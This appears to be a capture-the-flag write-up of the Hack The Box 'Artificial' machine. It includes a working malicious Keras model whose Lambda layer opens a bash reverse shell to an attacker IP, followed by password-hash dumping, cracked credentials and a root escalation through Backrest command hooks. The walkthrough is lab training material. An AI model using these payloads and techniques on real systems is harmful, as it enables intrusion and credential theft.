# Artificial

## Recon

::: details nmap_scan.log
```log
Open 10.10.11.74:22
Open 10.10.11.74:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.10.11.74

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNABz8gRtjOqG4+jUCJb2NFlaw1auQlaXe1/+I+BhqrriREBnu476PNw6mFG9ifT57WWE/qvAZQFYRvPupReMJD4C3bE3fSLbXAoP03+7JrZkNmPRpVetRjUwP1acu7golA8MnPGzGa2UW38oK/TnkJDlZgRpQq/7DswCr38IPxvHNO/15iizgOETTTEU8pMtUm/ISNQfPcGLGc0x5hWxCPbu75OOOsPt2vA2qD4/sb9bDCOR57bAt4i+WEqp7Ri/act+f4k6vypm1sebNXeYaKapw+W83en2LnJOU0lsdhJiAPKaD/srZRZKOR0bsPcKOqLWQR/A6Yy3iRE8fcKXzfbhYbLUiXZzuUJoEMW33l8uHuAza57PdiMFnKqLQ6LBfwYs64Q3v8oAn5O7upCI/nDQ6raclTSigAKpPbliaL0HE/P7UhNacrGE7Gsk/FwADiXgEAseTn609wBnLzXyhLzLb4UVu9yFRWITkYQ6vq4ZqsiEnAsur/jt8WZY6MQ8=
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOdlb8oU9PsHX8FEPY7DijTkQzsjeFKFf/xgsEav4qedwBUFzOetbfQNn3ZrQ9PMIHrguBG+cXlA2gtzK4NPohU=
|   256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH8QL1LMgQkZcpxuylBjhjosiCxcStKt8xOBU0TjCNmD
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://artificial.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![Writeup.png](/assets/pentest/htb/artificial/Writeup.png)

To use the application we need valid account, register and then login.

![Writeup-1.png](/assets/pentest/htb/artificial/Writeup-1.png)

### RCE

```bash
└─$ curl http://artificial.htb/static/requirements.txt
tensorflow-cpu==2.13.1

└─$ curl http://artificial.htb/static/Dockerfile
FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]
```

[Tersorflow Remote Code Execution with Malicious Model](https://github.com/Splinter0/tensorflow-rce)

```bash
└─$ nano exploit.py
import tensorflow as tf

def exploit(x):
    import os
    os.system("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.39/4444 0>&1'")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")

└─$ docker build -t tensor_exploit http://artificial.htb/static/Dockerfile
└─$ docker run -it --rm -v $(pwd):/data tensor_exploit
root@9b9dab581ed4:/code# python3 /data/exploit.py
root@9b9dab581ed4:/code# mv exploit.h5 /data/exploit.h5
```

### Reverse Shell

Upload, run and catch the shell

![Writeup-2.png](/assets/pentest/htb/artificial/Writeup-2.png)

```bash
(remote) app@artificial:/home/app/app$ grep ^app app.py
app = Flask(__name__)
app.secret_key = "Sup3rS3cr3tKey4rtIfici4L"
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['UPLOAD_FOLDER'] = 'models'
```

```bash
(remote) app@artificial:/home/app/app$ sqlite3 instance/users.db '.tables'
model  user
(remote) app@artificial:/home/app/app$ sqlite3 instance/users.db 'SELECT * FROM user' -header -column
id          username    email                password
----------  ----------  -------------------  --------------------------------
1           gael        gael@artificial.htb  c99175974b6e192936d97224638a34f8
2           mark        mark@artificial.htb  0f3d8c76530022670f1c6029eed09ccb
3           robert      robert@artificial.h  b606c5f5136170f15444251665638b36
4           royer       royer@artificial.ht  bc25b1f80f544c0ab451c02a3dca9fc6
5           mary        mary@artificial.htb  bf041041e57f1aff3be7ea1abd6129d0
```

![Writeup-3.png](/assets/pentest/htb/artificial/Writeup-3.png)

```
└─$ netexec ssh artificial.htb -u users.txt -p passwords.txt --continue-on-success
SSH         10.10.11.74     22     artificial.htb   [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.13
SSH         10.10.11.74     22     artificial.htb   [+] gael:mattp005numbertwo  Linux - Shell access!
...
```

> Creds: `gael:mattp005numbertwo`

## SSH

```bash
└─$ sshpass -p 'mattp005numbertwo' ssh gael@artificial.htb
gael@artificial:~$ id
uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)
```

### User.txt

```bash
gael@artificial:~$ cat user.txt
1160c1214413f56f3e91e03fb1fdc947
```

## Privilege Escalation

No sudo or suids
```bash
gael@artificial:~$ sudo -l
Sorry, user gael may not run sudo on artificial.
gael@artificial:~$ find / -perm -4000 2>/dev/null
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/mount
/usr/bin/sudo
/usr/bin/su
/usr/bin/passwd
/usr/bin/at
/usr/bin/umount
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
```

There's 1 unknown internal service running at 9898
```bash
gael@artificial:~$ ss -tunlp4
Netid    State      Recv-Q     Send-Q         Local Address:Port         Peer Address:Port    Process
udp      UNCONN     0          0              127.0.0.53%lo:53                0.0.0.0:*
tcp      LISTEN     0          2048               127.0.0.1:5000              0.0.0.0:*
tcp      LISTEN     0          4096               127.0.0.1:9898              0.0.0.0:*
tcp      LISTEN     0          511                  0.0.0.0:80                0.0.0.0:*
tcp      LISTEN     0          4096           127.0.0.53%lo:53                0.0.0.0:*
tcp      LISTEN     0          128                  0.0.0.0:22                0.0.0.0:*
```

### Backrest

Service is called Backrest
```bash
gael@artificial:~$ find /opt -readable -ls 2>/dev/null
   262148      4 drwxr-xr-x   8 root     root         4096 Jul 23 12:31 /opt
   263023      4 drwxr-xr-x   5 root     root         4096 Jul 23 15:00 /opt/backrest
   268970  25884 -rwxr-xr-x   1 root     root     26501272 Mar  3 04:28 /opt/backrest/restic
   262563      0 -rw-r--r--   1 root     root            0 Jul 23 15:00 /opt/backrest/oplog.sqlite-wal
   263046     32 -rw-r--r--   1 root     root        32768 Jul 23 15:00 /opt/backrest/oplog.sqlite-shm
   293051      4 drwxr-xr-x   3 root     root         4096 Mar  3 21:27 /opt/backrest/.config
   293052      4 drwxr-xr-x   2 root     root         4096 Jul 23 15:00 /opt/backrest/.config/backrest
   263699  25096 -rwxr-xr-x   1 app      ssl-cert 25690264 Feb 16 19:38 /opt/backrest/backrest
   268984      4 drwxr-xr-x   3 root     root         4096 Jul 23 15:00 /opt/backrest/tasklogs
   263050     32 -rw-r--r--   1 root     root        32768 Jul 23 15:00 /opt/backrest/tasklogs/logs.sqlite-shm
   293049      4 drwxr-xr-x   2 root     root         4096 Jul 23 13:29 /opt/backrest/tasklogs/.inprogress
   263048      0 -rw-r--r--   1 root     root            0 Jul 23 15:00 /opt/backrest/tasklogs/logs.sqlite-wal
   269665     52 -rw-r--r--   1 root     root        49152 Jul 23 13:40 /opt/backrest/tasklogs/logs.sqlite
   268973     76 -rw-r--r--   1 root     root        77824 Jul 23 15:00 /opt/backrest/oplog.sqlite
   263834      4 drwxr-xr-x   2 root     root         4096 Mar  3 21:18 /opt/backrest/processlogs
   263690      4 -rwxr-xr-x   1 app      ssl-cert     3025 Mar  3 04:28 /opt/backrest/install.sh
gael@artificial:~$ grep 9898 /opt/backrest/install.sh
Environment="BACKREST_PORT=127.0.0.1:9898"
        <string>127.0.0.1:9898</string>
echo "Access backrest WebUI at http://localhost:9898"
```

**[backrest](https://github.com/garethgeorge/backrest)**: Backrest is a web UI and orchestrator for restic backup.

Port forward
```bash
└─$ sshpass -p 'mattp005numbertwo' ssh gael@artificial.htb -L 9898:0:9898
```

Gael's password doesn't work.

`tasklogs` is empty
```bash
gael@artificial:/opt/backrest$ sqlite3 ./tasklogs/logs.sqlite '.tables'
logs          version_info
gael@artificial:/opt/backrest$ sqlite3 ./tasklogs/logs.sqlite 'SELECT * FROM version_info'
0
gael@artificial:/opt/backrest$ sqlite3 ./tasklogs/logs.sqlite 'SELECT * FROM logs'
```

```bash
gael@artificial:/opt/backrest$ sqlite3 ./oplog.sqlite '.tables'
operation_groups  operations        system_info
gael@artificial:/opt/backrest$ sqlite3 ./oplog.sqlite 'SELECT * FROM system_info'
4
gael@artificial:/opt/backrest$ sqlite3 ./oplog.sqlite 'SELECT * FROM operations'
gael@artificial:/opt/backrest$ sqlite3 ./oplog.sqlite 'SELECT * FROM operation_groups'
```

#### Backup

Search for similar files~
```bash
gael@artificial:/opt/backrest$ find / -type f -readable -iname 'backrest*' 2>/dev/null
/home/gael/.local/share/backrest/processlogs/backrest.log
/usr/local/bin/backrest
/opt/backrest/backrest
/var/backups/backrest_backup.tar.gz
/etc/systemd/system/backrest.service
```

```bash
gael@artificial:/tmp$ tar -xvf /var/backups/backrest_backup.tar.gz
backrest/
backrest/restic
backrest/oplog.sqlite-wal
backrest/oplog.sqlite-shm
backrest/.config/
backrest/.config/backrest/
backrest/.config/backrest/config.json
backrest/oplog.sqlite.lock
backrest/backrest
backrest/tasklogs/
backrest/tasklogs/logs.sqlite-shm
backrest/tasklogs/.inprogress/
backrest/tasklogs/logs.sqlite-wal
backrest/tasklogs/logs.sqlite
backrest/oplog.sqlite
backrest/jwt-secret
backrest/processlogs/
backrest/processlogs/backrest.log
backrest/install.sh

gael@artificial:/tmp$ cat backrest/.config/backrest/config.json
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```

```bash
└─$ echo 'JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP' | base64 -d > backrest_root.hash
➜ .\john-1.9.0-jumbo-1-win64\run\john.exe .\hashes.txt --wordlist=.\rockyou.txt
!@#$%^           (?)
```

>  Creds: `backrest_root:!@#$%^`

### Web UI

See [backrest getting started guide](https://garethgeorge.github.io/backrest/introduction/getting-started) for plan configuration instructions.

To create a Plan we need a Repository. Both of them have "Hooks", which can embed shell scripts. Create a very basic Repository with **Command Hook**, config can be changed anytime. Simplest trigger I found is **CONDITION_CHECK_START**.

![Writeup-4.png](/assets/pentest/htb/artificial/Writeup-4.png)

Once the config is done, use **Check Now** to trigger the hook 

![Writeup-5.png](/assets/pentest/htb/artificial/Writeup-5.png)

```bash
gael@artificial:/tmp$ ls -alh letmein_repo/ rootbash
-rwsrwxrwx 1 root root 1.2M Jul 23 15:51 rootbash

ls: cannot open directory 'letmein_repo/': Permission denied
```

```bash
gael@artificial:/tmp$ /tmp/rootbash -p
rootbash-5.0# id
uid=1000(gael) gid=1000(gael) euid=0(root) groups=1000(gael),1007(sysadm)
```

### Root.txt

```
rootbash-5.0# cat /root/root.txt
38bec6db1c255f331544cc8cbf9ed408
```